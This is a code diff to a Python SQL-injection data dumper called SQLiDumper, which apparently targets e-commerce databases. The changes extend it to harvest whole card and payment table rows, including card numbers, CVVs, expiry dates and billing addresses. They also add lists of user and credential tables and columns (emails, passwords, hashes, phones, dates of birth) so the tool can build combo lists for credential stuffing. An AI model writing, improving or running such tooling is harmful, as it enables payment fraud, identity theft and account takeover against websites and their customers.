@@ -87,8 +87,6 @@ class SQLiDumper:
             "stripe_payments", "paypal_payments", "braintree_transactions",
         ],
         # ---- Gateway keys / config (Stripe, PayPal, etc.) ----
-        # NOTE: Only specific payment-related config tables — generic names like
-        # "config", "settings", "options" removed to avoid dumping CMS junk
         "gateway_config": [
             "wp_options",
             "core_config_data", "site_settings",
@@ -98,6 +96,18 @@ class SQLiDumper:
             "wp_woocommerce_api_keys", "wp_woocommerce_payment_tokens",
             "vault_payment_token", "oauth_token",
             "payment_config", "payment_settings",
+        ],
+        # ---- User/credential tables (for combo generation) ----
+        "credentials": [
+            "users", "user", "members", "member", "accounts", "account",
+            "admin", "admins", "administrators", "login", "logins",
+            "customers", "customer", "clients", "client",
+            "subscribers", "subscriber", "registered_users",
+            "tbl_user", "tbl_users", "tbl_admin", "tbl_member",
+            "wp_users", "user_account", "user_login",
+            "customer_info", "customer_data", "customer_details",
+            "userdata", "userinfo", "user_info", "user_data",
+            "user_profile", "profiles", "profile",
         ],
         # ---- WooCommerce payment-specific tables ----
         "woo_payments": [
@@ -153,6 +163,17 @@ class SQLiDumper:
             "amount", "total", "subtotal", "currency", "payment_status",
             "payment_method", "payment_type", "transaction_id", "txn_id",
             "order_total", "grand_total", "charge_id", "refund_amount",
+        ],
+        # ---- Credential columns (for combo lists when card tables absent) ----
+        "credentials": [
+            "email", "email_address", "user_email", "mail",
+            "username", "user_name", "login", "user_login", "uname",
+            "password", "passwd", "pass", "user_pass", "pwd",
+            "password_hash", "pass_hash", "hash", "encrypted_password",
+            "first_name", "last_name", "full_name", "name",
+            "phone", "phone_number", "mobile", "cell", "telephone",
+            "address", "city", "state", "zip", "zip_code", "postal_code",
+            "country", "dob", "date_of_birth", "birthday",
         ],
     }
     
@@ -273,7 +294,7 @@ class SQLiDumper:
             category = self._is_target_column(col)
             if category in ("card_data", "card_security", "card_expiry", "card_holder"):
                 card_entry[col] = val
-            elif category in ("credentials", "emails", "usernames"):
+            elif category in ("credentials",):
                 cred_entry[col] = val
             elif category == "gateway_keys":
                 key_entry[col] = val
@@ -1707,21 +1728,48 @@ class SQLiDumper:
             
             dump.tables[table] = columns
             
-            # Filter to high-value columns — but for card/payment tables, extract all
+            # Determine if this is a core card/payment table that should get ALL columns extracted
+            _card_payment_keywords = (
+                "card", "cc", "credit", "payment", "billing", "checkout",
+                "transaction", "order", "invoice", "purchase", "charge",
+                "subscription", "stripe", "paypal", "braintree",
+            )
+            table_lower = table.lower()
+            is_card_payment_table = any(kw in table_lower for kw in _card_payment_keywords)
+            
+            # Filter to high-value columns — but for card/payment tables, extract ALL
             target_cols = []
             for col in columns:
                 if self._is_target_column(col):
                     target_cols.append(col)
             
-            # STRICT: Only extract if we found card/payment/key columns.
-            # If no target columns found, skip this table entirely to avoid
-            # dumping random CMS junk (thumbnails, blog posts, etc.)
-            if not target_cols:
-                logger.info(f"Skipping table '{table}' — no card/payment/key columns "
-                           f"among {len(columns)} cols: {columns[:8]}")
-                continue
-            
-            extract_cols = target_cols
+            if is_card_payment_table:
+                # Card/payment tables: extract ALL columns — the whole row matters
+                # (card number, holder name, expiry, CVV, billing address, etc.)
+                extract_cols = columns
+                if target_cols:
+                    logger.info(f"Card/payment table '{table}': extracting ALL "
+                               f"{len(columns)} columns ({len(target_cols)} matched whitelist)")
+                else:
+                    logger.info(f"Card/payment table '{table}': extracting ALL "
+                               f"{len(columns)} columns (0 matched whitelist, trusting table name)")
+            elif target_cols:
+                # Non-card table but has target columns — extract just those
+                extract_cols = target_cols
+            else:
+                # No card table, no target columns — check if it's a credential table
+                _cred_keywords = ("user", "member", "admin", "customer", "client",
+                                  "account", "login", "subscriber", "profile")
+                is_cred_table = any(kw in table_lower for kw in _cred_keywords)
+                if is_cred_table:
+                    # Extract all columns from credential tables for combo generation
+                    extract_cols = columns[:15]  # Cap at 15 cols to avoid excessive data
+                    logger.info(f"Credential table '{table}': extracting {len(extract_cols)} "
+                               f"columns for combo generation")
+                else:
+                    logger.info(f"Skipping table '{table}' — no card/payment/key columns "
+                               f"among {len(columns)} cols: {columns[:8]}")
+                    continue
             
             # Extract data
             rows = await self.extract_data(sqli, table, extract_cols, session)
